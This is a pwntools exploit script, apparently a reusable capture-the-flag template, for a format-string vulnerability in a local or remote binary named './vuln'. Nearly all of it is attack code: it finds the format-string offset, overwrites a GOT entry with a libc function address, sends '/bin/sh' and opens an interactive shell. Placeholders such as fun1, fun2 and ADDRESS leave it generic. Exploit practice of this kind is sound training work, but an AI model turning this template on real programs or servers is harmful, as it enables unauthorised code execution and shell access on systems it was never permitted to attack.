from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendline(payload)
    return io.recvline()


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Found manually (ASLR_OFF)
libc = elf.libc
libc.address = ADDRESS # find using `ldd vuln` 

# Or use pwntools to find automatically
# libc = ELF('libc.so.6', checksec=False)

f1 = elf.got.fun1           # Address to overwrite (GOT)
f2 = libc.symbols.fun2      # Address to write (libc function)

# Find the offset for format string write
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Print address to overwrite (f1 = GOT) 
# and what we want to write (f2 = libc function)
info("address to overwrite (elf.got.fun1): %#x", f1)
info("address to write (libc.functions.fun2): %#x", f2)

# Overwrite fun1 in GOT with fun2

# 1. manually
# str_addr  = str(hex(f2))[2:]
# addr_low  = int(str_addr[4:], 16)
# addr_high = int(str_addr[:4], 16)
# info("from addr %s found lower %#x and higher %#x parts", str_addr, addr_low, addr_high) 

# format_string.write(f1,     p16(addr_low))   # Lower-order
# format_string.write(f1 + 2, p16(addr_high))  # Higher-order

# 2. automagically
format_string.write(elf.got.fun1, libc.symbols.fun2)

# Execute the format string writes
format_string.execute_writes()

# Get our flag!
io.sendline(b'/bin/sh')
io.interactive()
